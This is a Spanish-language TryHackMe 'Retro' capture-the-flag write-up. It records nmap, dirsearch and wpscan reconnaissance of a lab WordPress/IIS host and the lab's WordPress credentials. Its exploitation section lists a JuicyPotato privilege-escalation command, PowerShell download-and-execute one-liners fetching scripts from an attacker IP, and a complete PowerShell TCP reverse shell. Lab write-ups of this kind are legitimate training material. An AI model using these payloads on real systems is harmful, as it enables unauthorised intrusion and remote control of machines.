---
VmName: Retro
Creator: 
Link: 
Completado: ✅
Level: Hard
Plataforma: TryHackMe
Release: 
---

# Retro - Extra credits

_There are two distinct paths that can be taken on Retro. One requires significantly less trial and error, however, both will work. Please check writeups if you are curious regarding the two paths._

**IP**::  10.10.234.9
**Nombre**::  Retro
**Sistema Operativo**:: 

## Reconocimiento 
En base all resultado de nmap y por RDP con el campo `Product_Version  10.0.14393` corresponde a [[Windows Versiones|Windows 10 (1607)]] 	

### Nmap 

**Puertos abiertos**
```
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
```


### Descubrimiento de directorios

Con diccionario de seclist identificamos un directorio. 

http://10.10.234.9/retro/

```
[May 29, 2022 - 00:30:09 (-04)] exegol-THM loot # python3 /usr/local/lib/python3.10/dist-packages/dirsearch/dirsearch.py -u http://10.10.234.9/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.2.4
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 207628

Output File: /usr/local/lib/python3.10/dist-packages/dirsearch/reports/10.10.234.9/__22-05-29_00-30-43.txt

Target: http://10.10.234.9/

[00:30:44] Starting:
[00:31:34] 301 -  148B  - /retro  ->  http://10.10.234.9/retro/
```


![[Pasted image 20220529003400.png|700]]


### Wordpress Recon

Version de Wordpres 5.2.1

```Bash
whatweb http://10.10.234.9/retro/
http://10.10.234.9/retro/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.234.9], JQuery, MetaGenerator[WordPress 5.2.1], Microsoft-IIS[10.0], PHP[7.1.29], Script[text/javascript], Title[Retro Fanatics &#8211; Retro Games, Books, and Movies Lovers], UncommonHeaders[link], WordPress[5.2.1], X-Powered-By[PHP/7.1.29]
```


#### Users 

Wade

### Credenciales


Se identifcan los credenciales en el post de Ready Player One 

![[Pasted image 20220529005722.png]]

Las credenciales nos permiten acceder al Wordpress como tambien por RDP.

|           | USUARIO | PASSWORD |
| --------- | ------- | -------- |
| Wordpress | Wade    | parzival |
| RDP       |         |          |
|           |         |          |

#### WPSCAN 

```
[May 29, 2022 - 00:40:24 (-04)] exegol-THM /workspace # wpscan --url http://10.10.234.9/retro/ --no-banner
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.234.9/retro/ [10.10.234.9]
[+] Started: Sun May 29 00:41:06 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Microsoft-IIS/10.0
 |  - X-Powered-By: PHP/7.1.29
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.234.9/retro/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.234.9/retro/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.234.9/retro/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.234.9/retro/index.php/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
 |  - http://10.10.234.9/retro/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>

[+] WordPress theme in use: 90s-retro
 | Location: http://10.10.234.9/retro/wp-content/themes/90s-retro/
 | Latest Version: 1.4.10 (up to date)
 | Last Updated: 2019-04-15T00:00:00.000Z
 | Readme: http://10.10.234.9/retro/wp-content/themes/90s-retro/readme.txt
 | Style URL: http://10.10.234.9/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1
 | Style Name: 90s Retro
 | Style URI: https://organicthemes.com/retro-theme/
 | Description: Have you ever wished your WordPress blog looked like an old Geocities site from the 90s!? Probably n...
 | Author: Organic Themes
 | Author URI: https://organicthemes.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4.10 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.234.9/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1, Match: 'Version: 1.4.10'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:11 <===================================================================> (137 / 137) 100.00% Time: 00:00:11

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun May 29 00:41:37 2022
[+] Requests Done: 186
[+] Cached Requests: 5
[+] Data Sent: 46.146 KB
[+] Data Received: 18.542 MB
[+] Memory used: 237.941 MB
[+] Elapsed time: 00:00:31
```

## Explotacion 

## Exploit
potato.exe -l 1340 -p rever.bat -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
.\potato.exe -l 1337 -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.11.72.213/rshell.ps1')" -t *
`powershell "IEX(New-Object Net.WebClient).downloadString('http://**attackerIP**/rev.ps1')"`
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.11.72.213",3711);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```
